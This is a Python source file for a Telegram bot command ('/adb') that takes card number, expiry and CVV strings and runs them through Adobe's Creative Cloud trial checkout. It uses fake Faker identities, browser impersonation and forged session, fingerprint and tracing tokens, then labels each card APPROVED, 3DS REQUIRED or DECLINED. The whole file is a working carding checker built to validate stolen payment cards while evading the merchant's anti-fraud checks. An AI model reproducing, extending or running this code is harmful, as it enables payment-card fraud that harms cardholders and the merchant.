# commands/adb.py
from aiogram import Router, types
from aiogram.filters import Command
import asyncio
import json
import base64
import secrets
import time
import uuid
import random
import re
import string
import hashlib
from faker import Faker
from curl_cffi import requests

router = Router()

def generateNewrelicHeaders():
    traceId = secrets.token_hex(16)
    spanId = secrets.token_hex(8)
    timestamp = int(time.time() * 1000)
    newrelicPayload = {"v":[0,1],"d":{"ty":"Browser","ac":"1347546","ap":"1834905430","id":spanId,"tr":traceId,"ti":timestamp,"tk":"1322840"}}
    newrelicToken = base64.b64encode(json.dumps(newrelicPayload, separators=(',',':')).encode()).decode()
    return {'newrelic':newrelicToken,'traceparent':f"00-{traceId}-{spanId}-01",'tracestate':f"1322840@nr=0-1-1347546-1834905430-{spanId}----{timestamp}",'x-adobe-clientsession':str(uuid.uuid4()),'x-request-id':str(uuid.uuid4())}

def generateSessionToken(clientSession):
    arkPrefix = f"{random.randint(100000000, 999999999)}{random.randint(100000000, 999999999)}f0{secrets.token_hex(3)}e{random.randint(10,99)}.{random.randint(1000000000, 9999999999)}"
    rid = random.randint(40, 100)
    ark = f"{arkPrefix}|r=us-east-1|meta=3|metabgclr=transparent|metaiconclr=%23757575|guitextcolor=%23000000|pk=AD73B601-F0A9-459E-B619-838E01BA7EDB|at=40|sup=1|rid={rid}|ag=101|cdn_url=https%3A%2F%2Farks-client.adobe.com%2Fcdn%2Ffc|surl=https%3A%2F%2Farks-client.adobe.com|smurl=https%3A%2F%2Farks-client.adobe.com%2Fcdn%2Ffc%2Fassets%2Fstyle-manager"
    ftrHash = secrets.token_hex(16)
    timestamp = int(time.time() * 1000)
    randomB64 = base64.b64encode(secrets.token_bytes(8)).decode()[:11]
    ftrNumber = random.randint(-3500, -3000)
    ftr = f"{ftrHash}_{timestamp}__UDF43-m4_23ck_{randomB64}={ftrNumber}-v2_tt"
    payload = {"sid":clientSession,"ark":ark,"ftr":ftr}
    sessionToken = base64.b64encode(json.dumps(payload, separators=(',',':')).encode()).decode()
    return sessionToken

def generateRandomString(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generateFingerprintToken(clientSession):
    arkPrefix = f"{random.randint(100000000, 999999999)}{random.randint(100000000, 999999999)}f0{secrets.token_hex(3)}e{random.randint(10,99)}.{random.randint(1000000000, 9999999999)}"
    rid = random.randint(40, 100)
    ark = f"{arkPrefix}|r=us-east-1|meta=3|metabgclr=transparent|metaiconclr=%23757575|guitextcolor=%23000000|pk=AD73B601-F0A9-459E-B619-838E01BA7EDB|at=40|sup=1|rid={rid}|ag=101|cdn_url=https%3A%2F%2Farks-client.adobe.com%2Fcdn%2Ffc|surl=https%3A%2F%2Farks-client.adobe.com|smurl=https%3A%2F%2Farks-client.adobe.com%2Fcdn%2Ffc%2Fassets%2Fstyle-manager"
    ftrFpHash = secrets.token_hex(16)
    timestamp = int(time.time() * 1000)
    randomB64Fp = base64.b64encode(secrets.token_bytes(8)).decode()[:11]
    ftrNumberFp = random.randint(-500, -100)
    ftrFp = f"{ftrFpHash}_{timestamp}__UDF43-m4_23ck_{randomB64Fp}={ftrNumberFp}-v2_tt"
    fpjsData = {"requestId":f"{timestamp}.{generateRandomString(6)}","visitorId":generateRandomString(20)}
    fingerprintPayload = {"sid":clientSession,"ark":ark,"ftr":ftrFp,"fpjs":json.dumps(fpjsData, separators=(',',':'))}
    fingerprintToken = base64.b64encode(json.dumps(fingerprintPayload, separators=(',',':')).encode()).decode()
    return fingerprintToken

def generateAdobeFp():
    browserFeatures = {'userAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36','language':'en-US','colorDepth':24,'deviceMemory':8,'hardwareConcurrency':8,'screenResolution':'1920x1080','timezone':'America/New_York','timestamp':int(time.time() * 1000),'random':random.random()}
    featuresString = ''.join(str(v) for v in browserFeatures.values())
    hashObj = hashlib.sha256(featuresString.encode())
    hashBytes = hashObj.digest()
    chars = string.ascii_letters + string.digits
    fingerprint = ''
    for i in range(20):
        byteVal = hashBytes[i % len(hashBytes)]
        fingerprint += chars[byteVal % len(chars)]
    return fingerprint

def parseCard(cardInput):
    parts = re.split(r'[|/]', cardInput)
    card = parts[0].strip()
    mes = parts[1].strip()
    ano = parts[2].strip()
    cvv = parts[3].strip() if len(parts) > 3 else ''
    if mes.startswith('0') and len(mes) == 2:
        mes = mes[1]
    if len(ano) == 2:
        ano = f"20{ano}"
    cardSpan = card[:9]
    cardShortNumber = card[-4:]
    cardType = 'VISA' if card.startswith('4') else 'MASTERCARD' if card.startswith('5') else 'AMEX' if card.startswith('3') else 'DISCOVER'
    return card, mes, ano, cvv, cardSpan, cardShortNumber, cardType

def formatResponse(responseText, card, mes, ano, cvv):
    data = json.loads(responseText)
    order = data.get('data', {}).get('placeOrder') or data.get('data', {}).get('updateOrder') or {}
    statusHint = order.get('statusHint')
    status = order.get('status', '')
    paymentInstrument = order.get('paymentInstrument', {})
    cardAuthentication = paymentInstrument.get('cardAuthentication', {}) if paymentInstrument else {}
    cartPrice = order.get('cartPrice', {})
    dueNext = cartPrice.get('dueNext', {}) if cartPrice else {}
    amount = str(dueNext.get('totalWithTax', 0)) if dueNext else '0'
    if status == 'OPEN':
        return f"✅ APPROVED – Status: OPEN, Amount: ${amount}"
    elif status == 'PENDING_AUTHENTICATION' or (cardAuthentication and (cardAuthentication.get('redirectUrl') or cardAuthentication.get('stepUpToken'))):
        return f"⚠️ 3DS REQUIRED – Card is live but needs OTP"
    elif status == 'IN_PROGRESS' or statusHint == 'SERVICE_ERROR':
        return f"❌ DECLINED – Payment could not be processed"
    else:
        return f"❌ DECLINED – Status: {status}"

def process_adobe_sync(card_str: str) -> str:
    card, mes, ano, cvv, cardSpan, cardShortNumber, cardType = parseCard(card_str)
    fake = Faker()
    email, firstName, lastName = f"{fake.first_name().lower()}{random.randint(1000,9999)}@gmail.com", fake.first_name(), fake.last_name()
    postalCode = fake.zipcode()
    savePaymentDataToken = ''
    orderIdValue = ''
    orderNumberValue = ''
    offerIdValue = ''
    tokenIdValue = ''
    contextIdValue = ''

    session = requests.Session(impersonate="chrome136", verify=False, timeout=12)

    # Request 1
    session.get("https://www.adobe.com/creativecloud/free-trial-download.html", headers={'user-agent':'Mozilla/5.0'})
    # Request 2
    session.get("https://commerce.adobe.com/store/recommendation?cli=creative&co=US&rf=uc_segmentation_hide_tabs_cr&lang=en&ms=COM&ot=TRIAL&cs=INDIVIDUAL&pa=ccsn_direct_individual&af=uc_new_user_iframe,uc_new_system_close&items[0][id]=65BA7CA7573834AC4D043B0E7CBD2349&items[0][q]=1&fps=t&apc=BFCCSN50PAEA", headers={'user-agent':'Mozilla/5.0'})
    # Request 3 - GET_PERSONALIZED_CONTENT
    dynamicHeaders = generateNewrelicHeaders()
    resp3 = session.post("https://commerce.adobe.com/api/graphql?GET_PERSONALIZED_CONTENT", headers=dynamicHeaders, json={"operationName":"GET_PERSONALIZED_CONTENT","variables":{"input":{"clientId":"creative","country":"US","locale":"en","surfaceId":"unified_checkout_v3"}},"query":"query GET_PERSONALIZED_CONTENT($input: PersonalizedContentInput!) { personalizedContent(input: $input) { containers { containerId data } } }"})
    # Request 4 - getAccountStatus
    dynamicHeaders2 = generateNewrelicHeaders()
    clientSession = dynamicHeaders2['x-adobe-clientsession']
    sessionToken = generateSessionToken(clientSession)
    session.post("https://commerce.adobe.com/api/graphql?getAccountStatus", headers=dynamicHeaders2, json={"operationName":"getAccountStatus","variables":{"userEmail":email,"sessionToken":sessionToken},"query":"query getAccountStatus($userEmail: String!, $sessionToken: String!) { accountVerification(email: $userEmail, sessionToken: $sessionToken) { status } }"})
    # Request 5 - savePaymentTransientData
    dynamicHeaders3 = generateNewrelicHeaders()
    resp5 = session.post("https://commerce.adobe.com/api/graphql", headers=dynamicHeaders3, json={"query":"mutation SavePaymentTransientData($input: SavePaymentTransientDataInput!) { savePaymentTransientData(input: $input) }","variables":{"input":{"browserData":{"userAgent":"Mozilla/5.0","deviceChannel":"BROWSER"},"vendor":"CARDINAL","cohort":"CARDINAL_DIRECT","returnUrl":""}}})
    match = re.search(r'"savePaymentTransientData":"([^"]+)"', resp5.text)
    if match:
        savePaymentDataToken = match.group(1)
    # Request 6 - CREATE_ORDER
    dynamicHeaders4 = generateNewrelicHeaders()
    resp6 = session.post("https://commerce.adobe.com/api/graphql?CREATE_ORDER", headers=dynamicHeaders4, json={"operationName":"CREATE_ORDER","variables":{"inputOrder":{"billingAddress":{"countryCode":"US"},"country":"US","cart":{"cartItems":[{"offerId":"65BA7CA7573834AC4D043B0E7CBD2349","quantity":1}]},"locale":"EN_US","marketSegment":"COM","purchaseFlow":"unified_checkout_client_v3_creative","status":"IN_PROGRESS","cartIdentity":{"accountCreationInfo":{"analytics":{"ac":"commerce.adobe.com"},"targetClient":{"clientId":"unified_checkout_client_v3","scopes":"AdobeID,openid","callbackUrl":"https://adobe.com"}}}},"locale":"EN_US"},"query":"mutation CREATE_ORDER($inputOrder: CreateOrderInput!, $locale: String!) { createOrder(input: $inputOrder) { id orderNumber cart { cartItems { offerId } } } }"})
    orderId = re.search(r'"id":"([^"]+)"', resp6.text)
    orderNumber = re.search(r'"orderNumber":"([^"]+)"', resp6.text)
    offerId = re.search(r'"offerId":"([^"]+)"', resp6.text)
    if orderId and orderNumber and offerId:
        orderIdValue = orderId.group(1)
        orderNumberValue = orderNumber.group(1)
        offerIdValue = offerId.group(1)
    else:
        return "❌ Failed to create order"
    # Request 7 - UPDATE_ORDER
    dynamicHeaders5 = generateNewrelicHeaders()
    clientSession2 = dynamicHeaders5['x-adobe-clientsession']
    fingerprintToken = generateFingerprintToken(clientSession2)
    session.post("https://commerce.adobe.com/api/graphql?UPDATE_ORDER", headers={**dynamicHeaders5, 'x-adobe-fingerprint-token':fingerprintToken}, json={"operationName":"UPDATE_ORDER","variables":{"inputOrder":{"billingAddress":{"countryCode":"US","postalCode":postalCode},"billingContact":{"primaryEmail":email},"id":orderIdValue,"orderNumber":orderNumberValue,"cart":{"cartItems":[{"offerId":offerIdValue,"quantity":1}]},"paymentInstrument":{"category":"CREDIT_CARD","creditCard":{"cardAuthentication":{"paymentTransientDataId":savePaymentDataToken},"cardSpan":cardSpan,"cardType":cardType}},"status":"IN_PROGRESS"},"locale":"EN_US"},"query":"mutation UPDATE_ORDER($inputOrder: UpdateOrderInput!, $locale: String!) { updateOrder(input: $inputOrder) { id } }"})
    # Request 8 - tokenize card (payment token)
    paymentTypeForTokenizer = 'MASTERCARD' if cardType == 'MASTERCARD' else cardType
    resp8 = session.post("https://tokui-commerce.adobe.com/v4/payment_tokens", params={'api_key':'unified_checkout_client_v3'}, headers={'user-agent':'Mozilla/5.0','content-type':'application/json'}, json={"payment_token":{"currency_code":"USD","client_id":"unified_checkout_client_v3","payment_instrument":{"@xsi.type":"CreditCardPaymentInstrument","payment_type":paymentTypeForTokenizer,"credit_card_number":card,"credit_card_expiry_date_display":f"{mes.zfill(2)}/{ano}","cv_code":"","assigned_address":{"postalCode":postalCode,"contact":{"firstName":firstName,"lastName":lastName,"primaryEmail":email},"country":{"iso_3166_alpha2_code":"US"}}}}})
    tokenMatch = re.search(r'"token_id":"([^"]+)"', resp8.text)
    if tokenMatch:
        tokenIdValue = tokenMatch.group(1)
    else:
        return "❌ Failed to get payment token"
    # Request 9 - createSUSIDynamicContext
    dynamicHeaders6 = generateNewrelicHeaders()
    resp9 = session.post("https://commerce.adobe.com/api/graphql?createSUSIDynamicContext", headers=dynamicHeaders6, json={"operationName":"createSUSIDynamicContext","variables":{"input":{"locale":"en","context":{"backgroundColor":"#F5F5F5FF","withAdobeLogoHeader":True,"dcpContainer":{"colorTheme":"DARK","position":"RIGHT","header":{"description":{"label":"Set your account password","size":2},"heading":{"label":"Creative Cloud Pro","size":1}}}}}},"query":"mutation createSUSIDynamicContext($input: SUSIDynamicContextInput!) { createSUSIDynamicContext(input: $input) { contextId } }"})
    contextMatch = re.search(r'"contextId":"([^"]+)"', resp9.text)
    if contextMatch:
        contextIdValue = contextMatch.group(1)
    # Request 10 - PLACE_ORDER
    dynamicHeaders7 = generateNewrelicHeaders()
    clientSession3 = dynamicHeaders7['x-adobe-clientsession']
    fingerprintToken2 = generateFingerprintToken(clientSession3)
    adobeFp = generateAdobeFp()
    resp10 = session.post("https://commerce.adobe.com/api/graphql?PLACE_ORDER", headers={**dynamicHeaders7, 'x-adobe-fingerprint-token':fingerprintToken2, 'x-adobe-fp':adobeFp}, json={"operationName":"PLACE_ORDER","variables":{"inputOrder":{"billingAddress":{"countryCode":"US","postalCode":postalCode},"billingContact":{"firstName":firstName,"lastName":lastName,"primaryEmail":email},"id":orderIdValue,"orderNumber":orderNumberValue,"cart":{"cartItems":[{"offerId":offerIdValue,"quantity":1}]},"paymentInstrument":{"category":"CREDIT_CARD","creditCard":{"cardAuthentication":{"paymentTransientDataId":savePaymentDataToken},"cardExpirationMonth":int(mes),"cardExpirationYear":int(ano),"cardShortNumber":cardShortNumber,"cardToken":tokenIdValue,"cardSpan":cardSpan,"cardType":cardType}},"status":"SUBMITTED"},"locale":"EN_US","isAuthenticated":False},"query":"mutation PLACE_ORDER($inputOrder: PlaceOrderInput!, $locale: String!, $isAuthenticated: Boolean!) { placeOrder(input: $inputOrder) { id status statusHint paymentInstrument { ... on CreditCardPaymentInstrument { cardAuthentication { redirectUrl } } } } }"})
    return formatResponse(resp10.text, card, mes, ano, cvv)

async def run_adb(card_str: str):
    return await asyncio.to_thread(process_adobe_sync, card_str)

@router.message(Command("adb"))
async def cmd_adb(message: types.Message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer("❌ **Usage:** `/adb CC|MM|YY|CVV`\nExample: `/adb 4111111111111111|12|28|123`")
        return
    card = args[1].strip()
    progress = await message.answer("⏳ Checking Adobe free trial...")
    result = await run_adb(card)
    await progress.edit_text(f"💳 `{card}`\n📦 {result}\n\nBy @hqdeven")
